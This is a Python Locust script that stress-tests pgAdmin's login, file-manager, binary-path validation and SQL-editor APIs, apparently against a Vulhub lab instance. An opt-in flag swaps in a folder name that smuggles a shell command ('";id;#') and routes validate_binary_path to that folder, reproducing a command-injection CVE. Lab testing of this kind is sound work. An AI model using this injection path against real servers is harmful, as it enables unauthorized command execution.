import json
import io
import os
import random
import re
import string
import time

from locust import HttpUser, between, events, task

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from request_logger import RequestLogger

REQUEST_LOGGER = RequestLogger(Path(__file__).resolve().parent / "request_log")
REQUEST_LOGGER.install(events)
import requests


# ========== Configuration ==========
HOST = os.getenv("PGADMIN_HOST", "http://localhost")
PORT = int(os.getenv("PGADMIN_PORT", "5050"))
BASE_URL = f"{HOST}:{PORT}"
USERNAME = os.getenv("PGADMIN_USERNAME", "vulhub@example.com")
PASSWORD = os.getenv("PGADMIN_PASSWORD", "vulhub")

# Use normal directory names for concurrent stress testing by default. Set to true to reproduce the CVE path.
ENABLE_CVE_PAYLOAD = os.getenv("PGADMIN_ENABLE_CVE_PAYLOAD", "false").lower() in ("1", "true", "yes")
VALIDATE_BINARY_PATH = os.getenv("PGADMIN_VALIDATE_BINARY_PATH", "/usr/bin/psql")

# The SQL Editor API depends on existing server/database/table IDs in the target environment and is disabled by default.
ENABLE_SQL_EDITOR = os.getenv("PGADMIN_ENABLE_SQL_EDITOR", "false").lower() in ("1", "true", "yes")
SQL_SERVER_GROUP_ID = os.getenv("PGADMIN_SQL_SERVER_GROUP_ID", "1")
SQL_SERVER_ID = os.getenv("PGADMIN_SQL_SERVER_ID", "1")
SQL_DATABASE_ID = os.getenv("PGADMIN_SQL_DATABASE_ID", "16384")
SQL_TABLE_ID = os.getenv("PGADMIN_SQL_TABLE_ID", "16385")
SQL_TABLE_TITLE = os.getenv("PGADMIN_SQL_TABLE_TITLE", "public.message/cve/postgres@cve")


# ========== Helper functions ==========
def random_str(length=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def extract_csrf_token(html):
    """Extract CSRF token from the pgAdmin initial page."""
    patterns = [
        r'"csrfToken"\s*:\s*"([^"]+)"',
        r"'csrfToken'\s*:\s*'([^']+)'",
        r'name="csrf_token"\s+type="hidden"\s+value="([^"]+)"',
        r'name="csrf_token"\s+value="([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            return match.group(1)
    return None


def normalize_url_path(path):
    """Aggregate dynamic IDs to prevent transId from splitting Locust statistics."""
    path = re.sub(r"/file_manager/filemanager/[^/?]+", "/file_manager/filemanager/:transId", path)
    path = re.sub(r"/file_manager/delete_trans_id/[^/?]+", "/file_manager/delete_trans_id/:transId", path)
    path = re.sub(r"/sqleditor/(panel|initialize/viewdata|status|view_data/start|poll|save|close)/[^/?]+", r"/sqleditor/\1/:transId", path)
    path = re.sub(r"/(\d+)(?=/|$)", "/:id", path)
    return path


class PgAdminUser(HttpUser):
    wait_time = between(1, 3)
    host = BASE_URL

    def on_start(self):
        self.session = requests.Session()
        self.session.trust_env = False
        self.csrf_token = None
        self.storage_id = None
        self.created_folder = None
        self.db_trans_id = None
        self._login()
        if ENABLE_SQL_EDITOR:
            self._init_sql_editor()

    def _send_request(self, method, url, name=None, expected_statuses=None, **kwargs):
        """Send a request and manually record Locust statistics."""
        full_url = f"{BASE_URL}{url}" if url.startswith("/") else f"{BASE_URL}/{url}"
        stat_name = name if name else normalize_url_path(url)
        expected_statuses = expected_statuses or set(range(200, 400))
        start_time = time.time()

        try:
            resp = self.session.request(method, full_url, timeout=30, **kwargs)
            REQUEST_LOGGER.write_response(resp, start_time, method, url)
            response_time = (time.time() - start_time) * 1000
            exception = None
            if resp.status_code not in expected_statuses:
                exception = Exception(f"HTTP {resp.status_code}: {resp.text[:200]}")

            events.request.fire(
                request_type=method.upper(),
                name=stat_name,
                response_time=response_time,
                response_length=len(resp.content),
                context={},
                exception=exception,
            )
            return resp
        except Exception as exc:
            response_time = (time.time() - start_time) * 1000
            events.request.fire(
                request_type=method.upper(),
                name=stat_name,
                response_time=response_time,
                response_length=0,
                context={},
                exception=exc,
            )
            raise

    def _csrf_headers(self, json_request=True):
        headers = {
            "X-pgA-CSRFToken": self.csrf_token,
            "X-Requested-With": "XMLHttpRequest",
        }
        if json_request:
            headers["Content-Type"] = "application/json"
        return headers

    def _login(self):
        """Log in to pgAdmin and save the session cookie."""
        resp = self._send_request("GET", "/")
        self.csrf_token = extract_csrf_token(resp.text)
        if not self.csrf_token:
            raise Exception("Unable to extract csrfToken from the pgAdmin home page")

        login_data = {
            "csrf_token": self.csrf_token,
            "email": USERNAME,
            "password": PASSWORD,
        }
        resp = self._send_request("POST", "/authenticate/login", data=login_data)
        if resp.status_code not in (200, 302):
            raise Exception(f"pgAdmin Login failed: {resp.status_code}")

        # Visit the main page after login to ensure the session is authenticated.
        dashboard = self._send_request("GET", "/browser/")
        refreshed_token = extract_csrf_token(dashboard.text)
        if refreshed_token:
            self.csrf_token = refreshed_token

    def _init_file_manager(self):
        """Initialize Storage Manager and return transId."""
        payload = {
            "dialog_type": "storage_dialog",
            "supported_types": ["sql", "csv", "json", "*"],
            "dialog_title": "Storage Manager",
        }
        resp = self._send_request(
            "POST",
            "/file_manager/init",
            json=payload,
            headers=self._csrf_headers(),
        )
        if resp.status_code != 200:
            raise Exception(f"Failed to initialize file_manager: {resp.status_code}")

        try:
            data = resp.json()
        except json.JSONDecodeError as exc:
            raise Exception(f"file_manager initialization response is not JSON: {resp.text[:200]}") from exc

        storage_id = data.get("data", {}).get("transId")
        if not storage_id:
            raise Exception(f"file_manager initialization did not return transId: {data}")
        self.storage_id = storage_id
        return storage_id

    def _build_folder_name(self):
        suffix = random_str(8)
        if ENABLE_CVE_PAYLOAD:
            return f"\";id;#locust_{suffix}"
        return f"locust_{suffix}"

    def _add_storage_folder(self, storage_id):
        """Create a random directory, covering the filemanager/addfolder API used by the CVE reproduction script."""
        folder_name = self._build_folder_name()
        payload = {
            "path": "/",
            "mode": "addfolder",
            "name": folder_name,
            "storage_folder": "my_storage",
        }
        resp = self._send_request(
            "POST",
            f"/file_manager/filemanager/{storage_id}",
            name="/file_manager/filemanager/:transId",
            json=payload,
            headers=self._csrf_headers(),
        )
        if resp.status_code == 200:
            self.created_folder = folder_name
        return resp

    def _get_files(self, storage_id, path="/"):
        """Read the file list in Storage Manager."""
        resp = self._send_request(
            "POST",
            f"/file_manager/filemanager/{storage_id}/",
            name="/file_manager/filemanager/:transId/?type=getfolder",
            json={
                "mode": "getfolder",
                "path": path,
                "file_type": "*",
                "show_hidden": True,
            },
            headers=self._csrf_headers(),
        )
        if resp.status_code != 200:
            return []
        try:
            return resp.json().get("data", {}).get("result", [])
        except json.JSONDecodeError:
            return []

    def _upload_file(self, storage_id, path="/"):
        """Upload a temporary text file."""
        file_name = f"test_{random_str(10)}.txt"
        file_content = io.BytesIO(f"locust file {file_name}".encode("utf-8"))
        if not path.endswith("/"):
            path += "/"

        resp = self._send_request(
            "POST",
            f"/file_manager/filemanager/{storage_id}/?type=add_file",
            name="/file_manager/filemanager/:transId/?type=add_file",
            data={"mode": "add", "currentpath": path},
            files={"newfile": (file_name, file_content, "text/plain")},
            headers=self._csrf_headers(json_request=False),
        )
        if resp.status_code == 200:
            return f"{path}{file_name}"
        return None

    def _rename_file_or_directory(self, storage_id, old_path, new_name):
        """Rename the newly created file or directory."""
        resp = self._send_request(
            "POST",
            f"/file_manager/filemanager/{storage_id}/?type=rename",
            name="/file_manager/filemanager/:transId/?type=rename",
            json={"mode": "rename", "old": old_path, "new": new_name},
            headers=self._csrf_headers(),
        )
        if resp.status_code == 200:
            parent = old_path.rsplit("/", 1)[0]
            return f"{parent}/{new_name}" if parent else f"/{new_name}"
        return None

    def _delete_file_or_directory(self, storage_id, path):
        """Delete the newly created file or directory."""
        return self._send_request(
            "POST",
            f"/file_manager/filemanager/{storage_id}/?type=delete",
            name="/file_manager/filemanager/:transId/?type=delete",
            json={"mode": "delete", "path": path},
            headers=self._csrf_headers(),
        )

    def _close_file_manager(self, storage_id):
        """Close the file manager transId and release server-side state."""
        return self._send_request(
            "DELETE",
            f"/file_manager/delete_trans_id/{storage_id}",
            name="/file_manager/delete_trans_id/:transId",
            headers=self._csrf_headers(json_request=False),
        )

    def _validate_binary_path(self):
        """Cover the validate_binary_path API used by the CVE reproduction script."""
        utility_path = VALIDATE_BINARY_PATH
        if ENABLE_CVE_PAYLOAD and self.created_folder:
            safe_email = USERNAME.replace("@", "_").replace(".", "_")
            utility_path = f"/var/lib/pgadmin/storage/{safe_email}/{self.created_folder}"

        payload = {"utility_path": utility_path}
        return self._send_request(
            "POST",
            "/misc/validate_binary_path",
            json=payload,
            headers=self._csrf_headers(),
        )

    def _init_sql_editor(self):
        """Initialize the SQL Editor view data transaction. Correct pgAdmin object IDs must be provided externally."""
        trans_id = random.randint(1, 9999999)
        panel_url = (
            f"/sqleditor/panel/{trans_id}"
            f"?is_query_tool=false&cmd_type=3&obj_type=table&obj_id={SQL_TABLE_ID}"
            f"&sgid={SQL_SERVER_GROUP_ID}&sid={SQL_SERVER_ID}&did={SQL_DATABASE_ID}&server_type=pg"
        )
        resp = self._send_request(
            "POST",
            panel_url,
            name="/sqleditor/panel/:transId",
            data={"title": SQL_TABLE_TITLE},
            headers={
                "X-pgA-CSRFToken": self.csrf_token,
                "Origin": BASE_URL,
                "Referer": f"{BASE_URL}/browser/",
            },
        )
        if resp.status_code != 200:
            raise Exception(f"SQL Editor panel initialization failed: {resp.status_code}")

        init_url = (
            f"/sqleditor/initialize/viewdata/{trans_id}/3/table/"
            f"{SQL_SERVER_GROUP_ID}/{SQL_SERVER_ID}/{SQL_DATABASE_ID}/{SQL_TABLE_ID}"
        )
        resp = self._send_request(
            "POST",
            init_url,
            name="/sqleditor/initialize/viewdata/:transId",
            headers=self._csrf_headers(json_request=False),
        )
        if resp.status_code != 200:
            raise Exception(f"SQL Editor viewdata initialization failed: {resp.status_code}")

        resp = self._send_request("GET", f"/sqleditor/status/{trans_id}", name="/sqleditor/status/:transId")
        if resp.status_code != 200:
            raise Exception(f"SQL Editor status check failed: {resp.status_code}")
        self.db_trans_id = trans_id

    def _poll_sql_editor_records(self):
        if not self.db_trans_id:
            return
        self._send_request("GET", f"/sqleditor/view_data/start/{self.db_trans_id}", name="/sqleditor/view_data/start/:transId")
        time.sleep(0.2)
        self._send_request("GET", f"/sqleditor/poll/{self.db_trans_id}", name="/sqleditor/poll/:transId")

    def _save_sql_editor_insert(self):
        if not self.db_trans_id:
            return
        message_id = random.randint(1, 9999999)
        payload = {
            "added_index": {"1": "1"},
            "added": {
                "1": {
                    "err": False,
                    "data": {
                        "message_id": message_id,
                        "message": f"locust_{random_str(10)}",
                    },
                }
            },
        }
        self._send_request(
            "POST",
            f"/sqleditor/save/{self.db_trans_id}?type=insert",
            name="/sqleditor/save/:transId?type=insert",
            json=payload,
            headers=self._csrf_headers(),
        )

    def _close_sql_editor(self):
        if not self.db_trans_id:
            return
        self._send_request(
            "DELETE",
            f"/sqleditor/close/{self.db_trans_id}",
            name="/sqleditor/close/:transId",
            headers=self._csrf_headers(json_request=False),
        )
        self.db_trans_id = None

    @task(4)
    def file_manager_flow(self):
        """Core post-login stress flow: initialize file manager, create a directory, and validate binary path."""
        storage_id = self._init_file_manager()
        self._add_storage_folder(storage_id)
        time.sleep(0.2)
        self._validate_binary_path()

    @task(2)
    def file_manager_lifecycle(self):
        """Cover the file listing, upload, rename, delete, and transId close APIs from the reference script."""
        storage_id = self._init_file_manager()
        self._get_files(storage_id)

        folder_resp = self._add_storage_folder(storage_id)
        folder_path = f"/{self.created_folder}" if folder_resp.status_code == 200 and self.created_folder else "/"
        uploaded_path = self._upload_file(storage_id, folder_path)

        if uploaded_path:
            renamed_name = f"renamed_{random_str(8)}.txt"
            renamed_path = self._rename_file_or_directory(storage_id, uploaded_path, renamed_name)
            if renamed_path:
                self._delete_file_or_directory(storage_id, renamed_path)

        if folder_path != "/":
            self._delete_file_or_directory(storage_id, folder_path)
        self._close_file_manager(storage_id)
        if self.storage_id == storage_id:
            self.storage_id = None

    @task(1)
    def sql_editor_flow(self):
        """Optional SQL Editor API flow; disabled by default and requires PGADMIN_ENABLE_SQL_EDITOR=true."""
        if not ENABLE_SQL_EDITOR:
            return
        if not self.db_trans_id:
            self._init_sql_editor()
        self._poll_sql_editor_records()
        self._save_sql_editor_insert()

    @task(1)
    def browse_pages(self):
        """Add normal browsing traffic; all APIs are pages accessible after pgAdmin login."""
        self._send_request("GET", "/browser/")
        time.sleep(0.2)
        self._send_request("GET", "/")

    def on_stop(self):
        if self.storage_id:
            self._close_file_manager(self.storage_id)
            self.storage_id = None
        self._close_sql_editor()


@events.test_start.add_listener
def on_test_start(environment, **kwargs):
    print("=== pgAdmin concurrent test started ===")
    print(f"Target URL: {BASE_URL}")
    print(f"Login user: {USERNAME}")
    print(f"CVE payload: {'enabled' if ENABLE_CVE_PAYLOAD else 'disabled'}")
    print(f"SQL Editor APIs: {'enabled' if ENABLE_SQL_EDITOR else 'disabled'}")
